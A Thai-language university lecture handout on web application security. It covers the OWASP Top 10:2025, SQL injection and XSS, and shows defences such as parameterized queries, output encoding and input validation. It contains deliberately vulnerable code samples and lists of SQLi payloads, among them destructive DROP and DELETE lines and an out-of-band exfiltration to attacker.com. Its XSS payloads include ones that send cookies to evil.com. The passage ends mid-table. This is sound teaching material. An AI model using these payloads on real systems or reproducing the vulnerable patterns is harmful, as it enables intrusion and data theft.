# Week 7: Web Application Security & OWASP Overview
## ENGSE214 – ความมั่นคงปลอดภัยทางไซเบอร์เบื้องต้น

**เวลาการสอน:** 2-3 ชั่วโมง (รวม Demo และ Lab)  
**CLO ที่เกี่ยวข้อง:** CLO2, CLO3

---

## 📚 ทบทวนเนื้อหาสัปดาห์ที่ผ่านมา

### Week 6: Cryptography Basics

```
┌─────────────────────────────────────────────────────────────────┐
│  🔐 สิ่งที่เราเรียนรู้ใน Week 6                                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✔ Symmetric Encryption (AES, DES)                             │
│    → ใช้ Key เดียวกันทั้งเข้ารหัสและถอดรหัส                        │
│    → เร็ว แต่มีปัญหาการแจก Key                                   │
│                                                                 │
│  ✔ Asymmetric Encryption (RSA, ECC)                            │
│    → ใช้ Public Key + Private Key                              │
│    → แก้ปัญหาการแจก Key แต่ช้ากว่า                               │
│                                                                 │
│  ✔ Hash Functions (SHA-256, SHA-3)                             │
│    → One-way function สำหรับตรวจสอบ Integrity                   │
│    → ใช้ใน Password Storage, Digital Signature                 │
│                                                                 │
│  ✔ Digital Certificates & PKI                                   │
│    → สร้างความเชื่อถือบน Internet (HTTPS)                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**🔗 Connection กับสัปดาห์นี้:**
- Cryptography ช่วยปกป้อง Data in Transit (HTTPS)
- แต่ถ้า **Application มีช่องโหว่** → Attacker เข้าถึงข้อมูลได้โดยตรง!
- สัปดาห์นี้เราจะเรียนรู้ช่องโหว่ใน Web Application และวิธีป้องกัน

---

## 🎯 วัตถุประสงค์การเรียนรู้ (Learning Objectives)

เมื่อจบ Week 7 นักศึกษาจะสามารถ:

1. อธิบาย OWASP Top 10 และความสำคัญในการพัฒนาซอฟต์แวร์ปลอดภัย
2. วิเคราะห์และสาธิตการโจมตีแบบ SQL Injection
3. วิเคราะห์และสาธิตการโจมตีแบบ Cross-Site Scripting (XSS)
4. ประยุกต์ใช้เทคนิค Input Validation และ Parameterized Query
5. นำหลักการ Secure Coding ไปใช้ในโค้ดของตนเอง

---

## 💭 คำถามชวนคิด

```
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║   🤔 "เว็บไซต์ธนาคารมี HTTPS (🔒) แล้ว                              ║
║       ทำไมยังถูก Hack ได้?"                                        ║
║                                                                   ║
║   คำตอบ: HTTPS ป้องกันเฉพาะ "Data in Transit"                      ║
║          แต่ไม่ได้ป้องกัน...                                         ║
║                                                                   ║
║   ❌ SQL Injection ที่ดึงข้อมูลทั้ง Database                        ║
║   ❌ XSS ที่ขโมย Session Cookie                                    ║
║   ❌ Broken Access Control ที่เข้าถึงข้อมูลคนอื่น                    ║
║   ❌ Security Misconfiguration ที่เปิดช่องให้โจมตี                   ║
║                                                                   ║
║   👉 Application Security ≠ Network Security                      ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

## 🌐 Part 1: ทำความรู้จัก OWASP

### 1.1 OWASP คืออะไร?

**OWASP (Open Worldwide Application Security Project)** เป็นองค์กรไม่แสวงหากำไรที่มุ่งเน้นการพัฒนาความปลอดภัยของซอฟต์แวร์

```
┌─────────────────────────────────────────────────────────────────┐
│                    🦎 OWASP Foundation                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  📋 Projects ที่สำคัญ:                                            │
│                                                                 │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐ │
│  │  OWASP Top 10   │  │  OWASP ZAP      │  │  OWASP Juice    │ │
│  │  (รายการช่องโหว่  │  │  (Security      │  │  Shop           │ │
│  │   สำคัญ)         │  │   Scanner)      │  │  (ระบบฝึกหัด)    │ │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘ │
│                                                                 │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐ │
│  │  OWASP ASVS     │  │  Cheat Sheets   │  │  Dependency     │ │
│  │  (มาตรฐานการ    │  │  (คู่มือ Secure  │  │  Check          │ │
│  │   ทดสอบ)        │  │   Coding)       │  │  (ตรวจ Library) │ │
│  └─────────────────┘  └─────────────────┘  └─────────────────┘ │
│                                                                 │
│  🌍 Website: https://owasp.org                                  │
│  📖 ทุกอย่างเป็น Open Source และ Free!                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 ทำไม OWASP Top 10 ถึงสำคัญ?

```
         ┌────────────────────────────────────────┐
         │  📊 OWASP Top 10 ถูกใช้เป็น...           │
         └───────────────┬────────────────────────┘
                         │
         ┌───────────────┼───────────────┐
         │               │               │
         ▼               ▼               ▼
    ┌─────────┐    ┌─────────┐    ┌─────────┐
    │มาตรฐาน  │    │แนวทาง   │    │ข้อกำหนด │
    │Compliance│   │Training │    │ในสัญญา  │
    │(PCI-DSS)│    │สำหรับ Dev│    │จ้างพัฒนา │
    └─────────┘    └─────────┘    └─────────┘
```

**ใครใช้ OWASP Top 10?**
- 🏢 บริษัทพัฒนาซอฟต์แวร์ทั่วโลก
- 🏦 สถาบันการเงิน (ข้อกำหนด PCI-DSS)
- 🏛️ หน่วยงานราชการ
- 🎓 สถาบันการศึกษา (รวมถึงเรา!)

---

## 📋 Part 2: OWASP Top 10:2025

### 2.1 ภาพรวม OWASP Top 10:2025

```
╔═════════════════════════════════════════════════════════════════════╗
║                    🏆 OWASP Top 10:2025                              ║
╠═════╦═══════════════════════════════════════════════════════════════╣
║ #1  ║ 🔓 Broken Access Control                                      ║
║     ║ → ผู้ใช้เข้าถึงข้อมูล/ฟังก์ชันที่ไม่ได้รับอนุญาต                     ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #2  ║ ⚙️ Security Misconfiguration                                   ║
║     ║ → การตั้งค่าความปลอดภัยผิดพลาดหรือไม่ครบถ้วน                      ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #3  ║ 📦 Software Supply Chain Failures [NEW!]                      ║
║     ║ → ช่องโหว่จาก Dependencies และ Third-party Libraries          ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #4  ║ 🔐 Cryptographic Failures                                      ║
║     ║ → การใช้งาน Cryptography ผิดวิธีหรืออ่อนแอ                       ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #5  ║ 💉 Injection (SQL, XSS, Command)                              ║
║     ║ → การแทรกโค้ดอันตรายผ่าน User Input                            ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #6  ║ 📐 Insecure Design                                             ║
║     ║ → ข้อบกพร่องในการออกแบบระบบตั้งแต่แรก                           ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #7  ║ 🔑 Authentication & Session Failures                          ║
║     ║ → ปัญหาในระบบ Login และ Session Management                    ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #8  ║ 🧩 Vulnerable and Outdated Components                          ║
║     ║ → ใช้ Library/Framework ที่มีช่องโหว่หรือเก่าเกินไป                ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #9  ║ 📝 Security Logging and Alerting Failures                      ║
║     ║ → ไม่มี Log หรือ Alert เมื่อเกิดเหตุการณ์ผิดปกติ                   ║
╠═════╬═══════════════════════════════════════════════════════════════╣
║ #10 ║ ⚠️ Mishandling of Exceptional Conditions [NEW!]               ║
║     ║ → จัดการ Error/Exception ไม่เหมาะสม                            ║
╚═════╩═══════════════════════════════════════════════════════════════╝
```

### 2.2 การเปลี่ยนแปลงจาก 2021 → 2025

```
      OWASP Top 10: 2021                    OWASP Top 10: 2025
      ─────────────────                    ─────────────────
   
   #1 Broken Access Control    ════════►  #1 Broken Access Control
   #5 Security Misconfiguration ═══════► #2 Security Misconfiguration ⬆️
                               ═══════►  #3 Supply Chain Failures 🆕
   #2 Cryptographic Failures   ════════►  #4 Cryptographic Failures ⬇️
   #3 Injection                ════════►  #5 Injection ⬇️
   #4 Insecure Design          ════════►  #6 Insecure Design ⬇️
   #7 Auth Failures            ════════►  #7 Auth Failures ─
   #6 Vulnerable Components    ════════►  #8 Vulnerable Components ⬇️
   #9 Logging Failures         ════════►  #9 Logging Failures ─
                               ═══════►  #10 Exceptional Conditions 🆕
   
   #8  Software Integrity → รวมใน #3
   #10 SSRF → รวมใน #1
```

### 2.3 หมวดหมู่ที่เราจะเน้นในวันนี้

```
┌─────────────────────────────────────────────────────────────────┐
│  🎯 Focus ของ Week 7                                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  1️⃣ A05:2025 - Injection                                       │
│     ├── SQL Injection (SQLi)                                    │
│     ├── Cross-Site Scripting (XSS)                              │
│     └── Command Injection                                       │
│                                                                 │
│  2️⃣ Input Validation & Secure Coding                           │
│     ├── Parameterized Queries                                   │
│     ├── Output Encoding                                         │
│     └── Whitelist Validation                                    │
│                                                                 │
│  ⏭️ สัปดาห์หน้า: A01 (Access Control), A02 (Misconfiguration)    │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 💉 Part 3: SQL Injection (SQLi)

### 3.1 SQL Injection คืออะไร?

**SQL Injection** คือการโจมตีโดยการแทรกคำสั่ง SQL ผ่าน User Input เพื่อให้ Database ทำงานตามที่ Attacker ต้องการ

```
                    ┌──────────────────────────────────────┐
                    │          Web Application             │
                    │                                      │
  User Input        │   ┌──────────────────────────────┐  │       Database
  ───────────────►  │   │   SELECT * FROM users        │  │  ──────────────►
  username: admin   │   │   WHERE username = 'admin'   │──┼──►  ✅ ปกติ
                    │   │   AND password = '1234'      │  │
                    │   └──────────────────────────────┘  │
                    │                                      │
                    └──────────────────────────────────────┘


                    ┌──────────────────────────────────────┐
                    │          Web Application             │
                    │                                      │
  Malicious Input   │   ┌──────────────────────────────┐  │       Database
  ───────────────►  │   │   SELECT * FROM users        │  │  ──────────────►
  username:         │   │   WHERE username = '' OR     │──┼──►  ❌ ถูกโจมตี!
  ' OR '1'='1       │   │   '1'='1' AND password = ''  │  │      (ได้ข้อมูลทั้งหมด)
                    │   └──────────────────────────────┘  │
                    │                                      │
                    └──────────────────────────────────────┘
```

### 3.2 ตัวอย่างโค้ดที่มีช่องโหว่ (Vulnerable Code)

#### PHP Example (❌ Vulnerable)

```php
<?php
// ❌ อันตราย! - String Concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users 
        WHERE username = '$username' 
        AND password = '$password'";

$result = mysqli_query($conn, $sql);
?>
```

#### Python Example (❌ Vulnerable)

```python
# ❌ อันตราย! - String Formatting
username = request.form['username']
password = request.form['password']

sql = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

cursor.execute(sql)
```

#### Node.js Example (❌ Vulnerable)

```javascript
// ❌ อันตราย! - Template Literals
const username = req.body.username;
const password = req.body.password;

const sql = `SELECT * FROM users 
             WHERE username = '${username}' 
             AND password = '${password}'`;

connection.query(sql, (err, results) => {
    // ...
});
```

### 3.3 ประเภทของ SQL Injection

```
┌─────────────────────────────────────────────────────────────────────┐
│                    📊 SQL Injection Types                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1️⃣ In-Band SQLi (Classic)                                         │
│     ├── Error-based: ใช้ Error message เพื่อดึงข้อมูล                │
│     │   Example: ' AND 1=CONVERT(int,(SELECT TOP 1 username...))-- │
│     │                                                               │
│     └── Union-based: ใช้ UNION เพื่อรวมผลลัพธ์                       │
│         Example: ' UNION SELECT username,password FROM users--     │
│                                                                     │
│  2️⃣ Blind SQLi                                                      │
│     ├── Boolean-based: สังเกตจาก True/False response               │
│     │   Example: ' AND 1=1-- (True) vs ' AND 1=2-- (False)         │
│     │                                                               │
│     └── Time-based: สังเกตจากเวลา Response                          │
│         Example: ' AND SLEEP(5)-- (รอ 5 วินาที)                     │
│                                                                     │
│  3️⃣ Out-of-Band SQLi                                                │
│     └── ส่งข้อมูลผ่านช่องทางอื่น เช่น DNS, HTTP Request              │
│         Example: ' AND (SELECT LOAD_FILE(CONCAT('\\\\',            │
│                  (SELECT password),'attacker.com\\')))--           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.4 ตัวอย่าง SQL Injection Payloads

```
┌─────────────────────────────────────────────────────────────────────┐
│  🎯 Common SQLi Payloads                                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  🔓 Authentication Bypass:                                          │
│  ─────────────────────────                                          │
│  ' OR '1'='1                                                        │
│  ' OR '1'='1'--                                                     │
│  ' OR '1'='1'/*                                                     │
│  admin'--                                                           │
│  ' OR 1=1#                                                          │
│                                                                     │
│  📊 Data Extraction:                                                │
│  ──────────────────                                                 │
│  ' UNION SELECT NULL,NULL,NULL--                                    │
│  ' UNION SELECT username,password,NULL FROM users--                │
│  ' UNION SELECT table_name,NULL FROM information_schema.tables--   │
│                                                                     │
│  💥 Destructive:                                                     │
│  ─────────────                                                       │
│  '; DROP TABLE users--                                              │
│  '; DELETE FROM products WHERE '1'='1                               │
│  '; UPDATE users SET password='hacked' WHERE username='admin'--    │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.5 🚨 กรณีศึกษาที่น่าสนใจ

#### Case Study 1: FlyCASS Airport Security Bypass (2024)

```
┌─────────────────────────────────────────────────────────────────────┐
│  🛫 FlyCASS SQL Injection - Airport Security Bypass (2024)          │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  📅 เดือนสิงหาคม 2024                                                │
│                                                                     │
│  🎯 เป้าหมาย: FlyCASS - ระบบ Known Crewmember (KCM)                  │
│     ใช้ให้นักบินและลูกเรือข้าม Security Checkpoint                     │
│                                                                     │
│  💥 ผลกระทบ:                                                         │
│     • สามารถสร้าง User ปลอมในระบบได้                                  │
│     • ข้าม Airport Security ได้โดยไม่ต้องตรวจ                         │
│     • อาจเข้าถึง Cockpit เครื่องบินโดยสารได้                          │
│                                                                     │
│  🔍 สาเหตุ: Error-based SQL Injection ใน Web Application            │
│                                                                     │
│  💬 ความเห็นจาก Reddit:                                              │
│     "A visible error-based SQL injection, in a system this         │
│      critical, in 2024? That's appalling."                         │
│                                                                     │
│  📚 บทเรียน: แม้จะเป็นระบบสำคัญ ก็ยังมีช่องโหว่พื้นฐาน                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

#### Case Study 2: ResumeLooters Campaign (2023-2024)

```
┌─────────────────────────────────────────────────────────────────────┐
│  👔 ResumeLooters - ขโมยข้อมูลจาก 65 เว็บไซต์หางาน                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  📊 สถิติ:                                                           │
│     • 2.2 ล้าน records ถูกขโมย                                      │
│     • 500,000+ ข้อมูลผู้หางาน                                        │
│     • 65 เว็บไซต์ใน 12 ประเทศ                                        │
│                                                                     │
│  🎯 ประเทศที่ถูกโจมตี:                                                │
│     India (12), Taiwan (10), Thailand (9), Vietnam (7)             │
│                                                                     │
│  🔧 เทคนิค: SQL Injection + XSS                                     │
│                                                                     │
│  📦 ข้อมูลที่ถูกขโมย:                                                  │
│     • ชื่อ-นามสกุล                                                    │
│     • เบอร์โทรศัพท์                                                   │
│     • Email                                                         │
│     • ประวัติการทำงาน                                                 │
│                                                                     │
│  ⚠️ ผลกระทบ: ข้อมูลถูกขายบน Telegram                                 │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.6 การป้องกัน SQL Injection

#### ✅ ใช้ Parameterized Queries (Prepared Statements)

**PHP (MySQLi)**
```php
<?php
// ✅ ปลอดภัย - Prepared Statement
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
?>
```

**PHP (PDO)**
```php
<?php
// ✅ ปลอดภัย - PDO Prepared Statement
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute([
    ':username' => $username,
    ':password' => $password
]);
$user = $stmt->fetch();
?>
```

**Python**
```python
# ✅ ปลอดภัย - Parameterized Query
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password)
)
```

**Node.js (MySQL2)**
```javascript
// ✅ ปลอดภัย - Prepared Statement
const [rows] = await connection.execute(
    'SELECT * FROM users WHERE username = ? AND password = ?',
    [username, password]
);
```

**Java (JDBC)**
```java
// ✅ ปลอดภัย - PreparedStatement
String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = conn.prepareStatement(sql);
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

#### ทำไม Parameterized Query ปลอดภัย?

```
┌─────────────────────────────────────────────────────────────────────┐
│  🛡️ Parameterized Query แยก "โค้ด" ออกจาก "ข้อมูล"                   │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  String Concatenation (❌):                                         │
│  ────────────────────────────                                       │
│                                                                     │
│  Query = "SELECT * FROM users WHERE username = '" + input + "'"    │
│                                                                     │
│  Input: ' OR '1'='1                                                 │
│  Query: SELECT * FROM users WHERE username = '' OR '1'='1'         │
│         ──────────────────────────────────────────────────         │
│                    ↑ input ถูกตีความเป็น SQL code                    │
│                                                                     │
│  Parameterized Query (✅):                                          │
│  ────────────────────────                                           │
│                                                                     │
│  Query = "SELECT * FROM users WHERE username = ?"                  │
│  Param = [" ' OR '1'='1 "]                                          │
│                                                                     │
│  Database เข้าใจว่า:                                                 │
│  - Query Structure: SELECT * FROM users WHERE username = ?         │
│  - Parameter Value: " ' OR '1'='1 " (เป็น String ไม่ใช่ SQL)        │
│                                                                     │
│  ผลลัพธ์: ค้นหา username ที่มีค่า " ' OR '1'='1 " (ไม่มี!)            │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 🎭 Part 4: Cross-Site Scripting (XSS)

### 4.1 XSS คืออะไร?

**Cross-Site Scripting (XSS)** คือการโจมตีโดยการแทรก JavaScript ที่เป็นอันตรายเข้าไปใน Web Page เพื่อให้ทำงานบน Browser ของผู้ใช้คนอื่น

```
┌─────────────────────────────────────────────────────────────────────┐
│                    🎭 XSS Attack Flow                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│   1. Attacker แทรก Script                                           │
│      ┌─────────┐                                                    │
│      │ Attacker│──► <script>document.location=                      │
│      └─────────┘    'http://evil.com/steal.php?c='+                 │
│                      document.cookie</script>                       │
│            │                                                        │
│            ▼                                                        │
│   2. Script ถูกเก็บใน Server/Database                               │
│      ┌─────────┐                                                    │
│      │  Server │  stores malicious script                           │
│      └─────────┘                                                    │
│            │                                                        │
│            ▼                                                        │
│   3. Victim เข้าชมหน้าเว็บ                                           │
│      ┌─────────┐      ┌─────────┐                                   │
│      │  Victim │ ◄─── │  Server │  serves page with script          │
│      └─────────┘      └─────────┘                                   │
│            │                                                        │
│            ▼                                                        │
│   4. Script ทำงานบน Browser ของ Victim                              │
│      ┌─────────┐      ┌─────────┐                                   │
│      │  Victim │ ───► │ Attacker│  Cookie ถูกส่งไปยัง Attacker       │
│      └─────────┘      │ Server  │                                   │
│                       └─────────┘                                   │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.2 ประเภทของ XSS

```
╔═════════════════════════════════════════════════════════════════════╗
║                    📊 XSS Types                                      ║
╠═════════════════════════════════════════════════════════════════════╣
║                                                                     ║
║  1️⃣ Stored XSS (Persistent)                                        ║
║  ───────────────────────────                                        ║
║  • Script ถูกเก็บใน Database                                        ║
║  • ทำงานทุกครั้งที่มีคนเข้าชมหน้านั้น                                   ║
║  • อันตรายที่สุด!                                                     ║
║                                                                     ║
║  Example: Comment box, User profile                                 ║
║  ┌──────────────────────────────────────────────────────┐          ║
║  │ Comment: <script>steal(document.cookie)</script>    │          ║
║  └──────────────────────────────────────────────────────┘          ║
║                                                                     ║
║  2️⃣ Reflected XSS (Non-Persistent)                                  ║
║  ─────────────────────────────────                                  ║
║  • Script อยู่ใน URL/Request                                        ║
║  • ต้องหลอกให้ Victim คลิก Link                                      ║
║  • พบบ่อยที่สุด                                                      ║
║                                                                     ║
║  Example: Search page, Error messages                               ║
║  ┌──────────────────────────────────────────────────────┐          ║
║  │ https://example.com/search?q=<script>alert(1)</script>│         ║
║  └──────────────────────────────────────────────────────┘          ║
║                                                                     ║
║  3️⃣ DOM-based XSS                                                    ║
║  ────────────────────                                               ║
║  • ทำงานฝั่ง Client (JavaScript)                                    ║
║  • ไม่ผ่าน Server                                                    ║
║  • ตรวจจับยาก                                                        ║
║                                                                     ║
║  Example: document.write(location.hash)                             ║
║  ┌──────────────────────────────────────────────────────┐          ║
║  │ https://example.com/page#<script>alert(1)</script>  │          ║
║  └──────────────────────────────────────────────────────┘          ║
║                                                                     ║
╚═════════════════════════════════════════════════════════════════════╝
```

### 4.3 ตัวอย่าง XSS Payloads

```
┌─────────────────────────────────────────────────────────────────────┐
│  🎯 Common XSS Payloads                                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  📢 Basic Alert (Testing):                                          │
│  ─────────────────────────                                          │
│  <script>alert('XSS')</script>                                      │
│  <script>alert(document.domain)</script>                            │
│                                                                     │
│  🍪 Cookie Stealing:                                                │
│  ───────────────────                                                │
│  <script>                                                           │
│    new Image().src="http://evil.com/steal?c="+document.cookie;     │
│  </script>                                                          │
│                                                                     │
│  🎨 HTML Injection:                                                  │
│  ─────────────────                                                   │
│  <img src=x onerror="alert('XSS')">                                 │
│  <svg onload="alert('XSS')">                                        │
│  <body onload="alert('XSS')">                                       │
│                                                                     │
│  🔗 Event Handlers:                                                 │
│  ─────────────────                                                   │
│  <a href="javascript:alert('XSS')">Click me</a>                     │
│  <div onmouseover="alert('XSS')">Hover here</div>                   │
│  <input onfocus="alert('XSS')" autofocus>                           │
│                                                                     │
│  🕳️ Filter Bypass:                                                   │
│  ────────────────                                                    │
│  <ScRiPt>alert('XSS')</ScRiPt>                                      │
│  <script>alert(String.fromCharCode(88,83,83))</script>             │
│  <img src="x" onerror="&#97;lert('XSS')">                           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 4.4 ตัวอย่างโค้ดที่มีช่องโหว่ vs ปลอดภัย

#### PHP - แสดงผล User Input (❌ Vulnerable)

```php
<!-- ❌ อันตราย! - ไม่มีการ Encode -->
<p>ค้นหา: <?php echo $_GET['search']; ?></p>
```

#### PHP - แสดงผล User Input (✅ Safe)

```php
<!-- ✅ ปลอดภัย - ใช้ htmlspecialchars() -->
<p>ค้นหา: <?php echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8'); ?></p>
```

#### JavaScript - DOM Manipulation (❌ Vulnerable)

```javascript
// ❌ อันตราย! - innerHTML
const searchTerm = location.search.split('=')[1];
document.getElementById('result').innerHTML = 'คุณค้นหา: ' + searchTerm;
```

#### JavaScript - DOM Manipulation (✅ Safe)

```javascript
// ✅ ปลอดภัย - textContent
const searchTerm = location.search.split('=')[1];
document.getElementById('result').textContent = 'คุณค้นหา: ' + searchTerm;
```

### 4.5 การป้องกัน XSS

```
┌─────────────────────────────────────────────────────────────────────┐
│  🛡️ XSS Prevention Strategies                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1️⃣ Output Encoding (Context-aware)                                 │
│  ───────────────────────────────────                                │
│  • HTML Context: htmlspecialchars()                                 │
│  • JavaScript Context: JSON.stringify() + escape                   │
│  • URL Context: urlencode()                                         │
│  • CSS Context: CSS escape                                          │
│                                                                     │
│  2️⃣ Content Security Policy (CSP)                                   │
│  ────────────────────────────────                                   │
│  Content-Security-Policy: default-src 'self';                       │
│                           script-src 'self';                        │
│                           style-src 'self' 'unsafe-inline'          │
│                                                                     │
│  3️⃣ HTTPOnly Cookies                                                │
│  ───────────────────                                                │
│  Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict     │
│                                                                     │
│  4️⃣ Input Validation (Whitelist)                                    │
│  ────────────────────────────────                                   │
│  • ตรวจสอบ Format (email, phone, date)                              │
│  • จำกัดความยาว                                                      │
│  • Whitelist allowed characters                                    │
│                                                                     │
│  5️⃣ Modern Frameworks                                               │
│  ────────────────────                                               │
│  • React: JSX escapes by default                                   │
│  • Angular: Template escapes by default                            │
│  • Vue: v-text escapes by default                                  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

---

## ✅ Part 5: Input Validation & Secure Coding

### 5.1 หลักการ Input Validation

```
╔═══════════════════════════════════════════════════════════════════╗
║                 📋 Input Validation Principles                     ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  🎯 Golden Rule: "Never Trust User Input"                         ║
║                                                                   ║
║  ┌─────────────────────────────────────────────────────────────┐ ║
║  │                                                             │ ║
║  │    User Input ──► Validate ──► Sanitize ──► Use             │ ║
║  │                       │            │                        │ ║
║  │                       ▼            ▼                        │ ║
║  │                   ❌ Reject    🧹 Clean                      │ ║
║  │                   if invalid   dangerous                    │ ║
║  │                               characters                    │ ║
║  │                                                             │ ║
║  └─────────────────────────────────────────────────────────────┘ ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

### 5.2 Validation Strategies

```
┌─────────────────────────────────────────────────────────────────────┐
│  🔍 Validation Approaches                                           │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ✅ Whitelist (Allowlist) - แนะนำ!                                  │
│  ───────────────────────────────                                    │
│  • อนุญาตเฉพาะสิ่งที่รู้ว่าปลอดภัย                                     │
│  • Example: /^[a-zA-Z0-9]+$/                                        │
│                                                                     │
│  ⚠️ Blacklist (Denylist) - ไม่แนะนำ                                  │
│  ────────────────────────────────                                   │
│  • พยายามบล็อกสิ่งที่อันตราย                                          │
│  • ปัญหา: มักมีวิธี Bypass                                           │
│                                                                     │
│  📊 เปรียบเทียบ:                                                     │
│  ┌────────────────┬──────────────────┬──────────────────┐          │
│  │                │    Whitelist     │    Blacklist     │          │
│  ├────────────────┼──────────────────┼──────────────────┤          │
│  │ แนวคิด          │ อนุญาตที่รู้       │ บล็อกที่รู้        │          │
│  │ ความปลอดภัย     │ สูง              │ ต่ำ               │          │
│  │ Bypass         │ ยาก              │ ง่าย             │          │
│  │ Maintenance    │ ต่ำ              │ สูง              │          │
│  └────────────────┴──────────────────┴──────────────────┘          │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.3 ตัวอย่าง Input Validation

#### Email Validation

```php
<?php
// ✅ PHP - Email Validation
$email = $_POST['email'];

// Method 1: filter_var (แนะนำ)
if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
    // Valid email
} else {
    // Invalid email
}

// Method 2: Regex
$pattern = '/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/';
if (preg_match($pattern, $email)) {
    // Valid email
}
?>
```

#### Username Validation

```python
# ✅ Python - Username Validation
import re

def validate_username(username):
    # Rules:
    # - 3-20 characters
    # - Alphanumeric and underscore only
    # - Must start with letter
    
    pattern = r'^[a-zA-Z][a-zA-Z0-9_]{2,19}$'
    
    if re.match(pattern, username):
        return True
    return False

# Test
print(validate_username("john_doe123"))  # True
print(validate_username("123john"))      # False (starts with number)
print(validate_username("jo"))           # False (too short)
```

#### Numeric Validation

```javascript
// ✅ JavaScript - Numeric Validation
function validateAge(input) {
    // Parse as integer
    const age = parseInt(input, 10);
    
    // Check if valid number
    if (isNaN(age)) {
        return { valid: false, error: 'Not a number' };
    }
    
    // Check range
    if (age < 0 || age > 150) {
        return { valid: false, error: 'Age out of range' };
    }
    
    return { valid: true, value: age };
}

// Test
console.log(validateAge("25"));     // { valid: true, value: 25 }
console.log(validateAge("-5"));     // { valid: false, error: 'Age out of range' }
console.log(validateAge("abc"));    // { valid: false, error: 'Not a number' }
```

### 5.4 Secure Coding Principles

```
┌─────────────────────────────────────────────────────────────────────┐
│  🏗️ Secure Coding Principles                                        │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  1️⃣ Defense in Depth                                                │
│     ─────────────────                                               │
│     ไม่พึ่งพาการป้องกันเพียงจุดเดียว                                    │
│     Example: Validate both client-side AND server-side             │
│                                                                     │
│  2️⃣ Principle of Least Privilege                                    │
│     ────────────────────────────                                    │
│     ให้สิทธิ์น้อยที่สุดเท่าที่จำเป็น                                     │
│     Example: Database user มีสิทธิ์ SELECT เท่านั้น                  │
│                                                                     │
│  3️⃣ Fail Securely                                                    │
│     ─────────────                                                    │
│     เมื่อเกิด Error ให้ Default เป็น Deny                            │
│     Example: if (error) { deny_access(); }                         │
│                                                                     │
│  4️⃣ Don't Trust Services                                            │
│     ─────────────────────                                           │
│     Third-party services ก็ต้อง validate                           │
│     Example: Verify API responses                                  │
│                                                                     │
│  5️⃣ Separation of Duties                                            │
│     ──────────────────────                                          │
│     แยกหน้าที่ไม่ให้คนเดียวทำทุกอย่าง                                   │
│     Example: Dev ไม่ควรมี Production DB access                      │
│                                                                     │
│  6️⃣ Avoid Security by Obscurity                                     │
│     ──────────────────────────────                                  │
│     อย่าพึ่งพาการซ่อนเป็นความปลอดภัยหลัก                                │
│     Example: Hidden admin URL ไม่ใช่ security                       │
│                                                                     │
│  7️⃣ Keep Security Simple (KISS)                                     │
│     ──────────────────────────                                      │
│     ระบบที่ซับซ้อนมักมี Bug                                           │
│     Example: ใช้ Library ที่พิสูจน์แล้วแทน Custom code               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### 5.5 OWASP กับโค้ดที่นักศึกษาเคยเขียน

```
╔═══════════════════════════════════════════════════════════════════╗
║  🎓 Mapping OWASP กับ Code Patterns ที่พบบ่อยในโปรเจคนักศึกษา        ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  📝 Pattern ที่พบบ่อย            →  ช่องโหว่ OWASP                  ║
║  ───────────────────────────────────────────────────────────────  ║
║                                                                   ║
║  String concat ใน SQL           →  A05: Injection (SQLi)          ║
║  echo $_GET['param']            →  A05: Injection (XSS)           ║
